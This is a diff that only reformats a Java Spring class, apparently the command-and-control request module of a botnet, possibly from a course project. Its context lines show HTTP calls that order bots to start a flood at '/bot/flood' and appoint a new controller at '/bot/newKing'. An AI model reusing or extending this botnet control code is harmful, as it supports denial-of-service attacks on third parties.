@@ -13,21 +13,14 @@ import org.springframework.web.client.RestTemplate;
 import cs.sii.domain.IP;
 import cs.sii.domain.Pairs;
 
-
 @Service("CeCRequest")
 public class CecRequest {
-	// TODO cambiare il tempo e prenderlo da properties
 	private static final int WAIT_RANGE = 250;
-
 	private static final String PORT = ":8443";
-
 	private static final String HTTPS = "https://";
 	private static final String HTTP = "http://";
-
 	public final static Integer REQNUMBER = 10;
-
 	private static final int TIMEOUT_MILLIS = 600000;
-
 	private RestTemplate restTemplate = new RestTemplate();
 
 	/**
@@ -41,9 +34,9 @@ public class CecRequest {
 		data.setValue1(myIp);
 		String str = Base64.encodeBase64String(myPublicKey.getEncoded());
 		data.setValue2(str);
-			return sendInfoToDnsServer(dnsUrl, myIp, str);
+		return sendInfoToDnsServer(dnsUrl, myIp, str);
 	}
-	
+
 	/**
 	 * @param dnsUrl
 	 * @param myIp
@@ -73,11 +66,12 @@ public class CecRequest {
 			}
 		}
 	}
+
 	@Async
-	public Boolean sendFloodToBot(String ipBot,String msg) {
-		Boolean response=false;
-		Integer count=0;
-		while (count<REQNUMBER) {
+	public Boolean sendFloodToBot(String ipBot, String msg) {
+		Boolean response = false;
+		Integer count = 0;
+		while (count < REQNUMBER) {
 			try {
 				String url = HTTPS + ipBot + PORT + "/bot/flood";
 				System.out.println("url bot flood" + url);
@@ -97,17 +91,15 @@ public class CecRequest {
 		return response;
 	}
 
-
 	public boolean becameCc(String ip) {
-		Boolean response=false;
-		Integer count=0;
-		while (count<REQNUMBER) {
+		Boolean response = false;
+		Integer count = 0;
+		while (count < REQNUMBER) {
 			try {
 				String url = HTTPS + ip + PORT + "/bot/newKing";
 				response = restTemplate.postForObject(url, null, response.getClass());
 				return response;
 			} catch (Exception e) {
-				// e.printStackTrace();
 				System.out.println("Errore invio richiesta kingsivcuuto");
 				try {
 					count++;
@@ -119,9 +111,7 @@ public class CecRequest {
 		}
 		return response;
 	}
-	
 
-
-	//  allinea CeC se piu di uno
+	// allinea CeC se piu di uno
 
 }
